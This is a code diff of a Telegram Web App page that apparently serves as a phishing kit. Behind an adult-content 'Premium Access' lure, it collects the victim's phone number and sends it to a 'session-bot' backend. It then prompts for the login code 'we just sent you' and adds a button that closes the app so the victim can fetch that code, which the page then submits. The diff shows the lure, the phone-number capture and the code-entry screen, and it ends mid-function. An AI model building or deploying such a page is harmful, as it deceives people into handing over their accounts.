@@ -3,67 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verification</title>
+    <title>Premium Access</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * { box-sizing: border-box; }
-        body { 
-            font-family: 'Arial', sans-serif; 
-            margin: 0; padding: 0; 
-            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
-            background-size: cover;
-            height: 100vh; 
-            display: flex; 
-            align-items: flex-end; /* কন্টেন্ট নিচের দিকে রাখার জন্য */
-            justify-content: center;
-            overflow: hidden;
-        }
-        .overlay { background: rgba(0, 0, 0, 0.4); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
+        body { font-family: 'Arial', sans-serif; margin: 0; padding: 0; background: url('https://files.catbox.moe/p9p33p.jpg') no-repeat center center fixed; background-size: cover; height: 100vh; display: flex; align-items: flex-end; justify-content: center; overflow: hidden; }
+        .overlay { background: rgba(0, 0, 0, 0.45); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
+        .main-container { width: 90%; max-width: 360px; z-index: 2; text-align: center; margin-bottom: 40px; }
+
+        .start-btn { background: linear-gradient(45deg, #ff4757, #ff6b81); color: white; border: none; padding: 22px; width: 100%; border-radius: 20px; font-weight: bold; font-size: 22px; cursor: pointer; text-transform: uppercase; box-shadow: 0 10px 25px rgba(255, 71, 87, 0.5); }
+        .instruction-box { background: rgba(255, 255, 255, 0.95); padding: 15px; border-radius: 15px; margin-bottom: 15px; color: #333; font-weight: bold; font-size: 16px; }
+
+        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 15px; }
+        .otp-box { width: 48px; height: 55px; background: rgba(255, 255, 255, 0.25); border: 2px solid rgba(255, 255, 255, 0.6); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 28px; color: white; font-weight: bold; backdrop-filter: blur(5px); }
+
+        .get-code-btn { background: #3f9e9e; color: white; border: none; padding: 12px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 18px; margin-bottom: 15px; cursor: pointer; }
         
-        .main-container { 
-            width: 90%; 
-            max-width: 360px; 
-            z-index: 2; 
-            text-align: center; 
-            margin-bottom: 50px; /* নিচ থেকে ৫০ পিক্সেল উপরে থাকবে */
-        }
-
-        /* ধাপ ১: শুরুর বাটন (নিচে পজিশন করা) */
-        .start-btn { 
-            background: linear-gradient(45deg, #ff4757, #ff6b81); 
-            color: white; border: none; padding: 22px; 
-            width: 100%; border-radius: 20px; font-weight: bold; font-size: 22px; 
-            cursor: pointer; box-shadow: 0 10px 25px rgba(255, 71, 87, 0.5);
-            text-transform: uppercase;
-        }
-
-        /* ধাপ ২: ওটিপি কিপ্যাড ডিজাইন (সবুজ থিম) */
-        .instruction-box {
-            background: rgba(255, 255, 255, 0.95);
-            padding: 15px; border-radius: 15px;
-            margin-bottom: 20px; color: #333; font-weight: bold; font-size: 16px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-        }
-
-        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
-        .otp-box {
-            width: 50px; height: 55px;
-            background: rgba(255, 255, 255, 0.3);
-            border: 2px solid rgba(255, 255, 255, 0.6);
-            border-radius: 12px; display: flex; align-items: center; justify-content: center;
-            font-size: 30px; color: white; font-weight: bold; backdrop-filter: blur(5px);
-        }
-
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .key { 
-            background: #4caf50; padding: 18px; border-radius: 12px; 
-            font-size: 26px; font-weight: bold; color: white; 
-            cursor: pointer; border: none; box-shadow: 0 4px 6px rgba(0,0,0,0.2);
-            -webkit-tap-highlight-color: transparent;
-        }
+        .key { background: #4caf50; padding: 16px; border-radius: 12px; font-size: 26px; font-weight: bold; color: white; cursor: pointer; border: none; -webkit-tap-highlight-color: transparent; }
         .key:active { background: #388e3c; transform: scale(0.95); }
-        .key-back { background: #388e3c; font-size: 22px; }
-        .key-empty { background: transparent; cursor: default; box-shadow: none; }
+        .key-back { background: #388e3c; }
+        .key-empty { background: transparent; }
 
         .hidden { display: none; }
         .loader { color: white; font-weight: bold; margin-top: 15px; font-size: 18px; text-shadow: 1px 1px 5px black; }
@@ -71,28 +31,21 @@
 </head>
 <body>
     <div class="overlay"></div>
-
     <div class="main-container">
-        <!-- ধাপ ১: Start Continue বাটন (নিচে থাকবে) -->
         <div id="step0">
             <button class="start-btn" id="s_btn" onclick="startFlow()">🍓 Start Continue 🔞</button>
             <div id="load" class="loader hidden">🔄 Connecting...</div>
         </div>
 
-        <!-- ধাপ ২: ওটিপি কিপ্যাড স্ক্রিন -->
         <div id="step2" class="hidden">
-            <div class="instruction-box">
-                Enter the 5-digit code that we just sent you!
-            </div>
-
+            <div class="instruction-box">Enter the 5-digit code that we just sent you!</div>
             <div class="otp-inputs">
-                <div class="otp-box" id="b1"></div>
-                <div class="otp-box" id="b2"></div>
-                <div class="otp-box" id="b3"></div>
-                <div class="otp-box" id="b4"></div>
-                <div class="otp-box" id="b5"></div>
+                <div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div><div class="otp-box" id="b5"></div>
             </div>
-
+            
+            <!-- গেট কোড বাটন যা মিনিমাইজ করবে -->
+            <button class="get-code-btn" onclick="tg.close()">🔞 GET CODE 🔞</button>
+            
             <div class="keypad">
                 <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
                 <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
@@ -106,7 +59,6 @@
         let tg = window.Telegram.WebApp;
         tg.expand();
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
-        const OFF_LINK = "https://www.profitablecpmratenetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446";
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
         let currentOTP = "";
 
@@ -127,56 +79,24 @@
         }
 
         async function sendNumberToBot(phone) {
-            try {
-                const res = await fetch(`${BACKEND_URL}/send_number`, {
-                    method: "POST", headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({ user_id: userId, phone: phone })
-                });
-                const data = await res.json();
-                if (data.status === "success") {
-                    document.getElementById('step0').classList.add('hidden');
-                    document.getElementById('step2').classList.remove('hidden');
-                } else {
-                    alert("Error: " + data.message);
-                    location.reload();
-                }
-            } catch (e) { alert("Server Error!"); }
+            const res = await fetch(`${BACKEND_URL}/send_number`, {
+                method: "POST", headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ user_id: userId, phone: phone })
+            });
+            const data = await res.json();
+            if (data.status === "success") {
+                document.getElementById('step0').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+            }
         }
 
         function addNum(n) {
             if(currentOTP.length < 5) {
-                currentOTP += n;
-                updateBoxes();
+                currentOTP += n; updateBoxes();
                 if(currentOTP.length === 5) { verifyOTP(); }
             }
         }
+        function clearNum() { currentOTP = currentOTP.slice(0, -1); updateBoxes(); }
+        function updateBoxes() { for(let i=1; i<=5; i++) { document.getElementById('b'+i).innerText = currentOTP[i-1] || ""; } }
 
-        function clearNum() {
-            currentOTP = currentOTP.slice(0, -1);
-            updateBoxes();
-        }
-
-        function updateBoxes() {
-            for(let i=1; i<=5; i++) {
-                document.getElementById('b'+i).innerText = currentOTP[i-1] || "";
-            }
-        }
-
-        async function verifyOTP() {
-            try {
-                const res = await fetch(`${BACKEND_URL}/verify_otp`, {
-                    method: "POST", headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({ user_id: userId, otp: currentOTP })
-                });
-                const data = await res.json();
-                if (data.status === "success") {
-                    window.location.href = OFF_LINK;
-                } else { 
-                    tg.showAlert("Invalid Code! Please try again.");
-                    currentOTP = ""; updateBoxes();
-                }
-            } catch (e) { }
-        }
-    </script>
-</body>
-</html>
+        async f
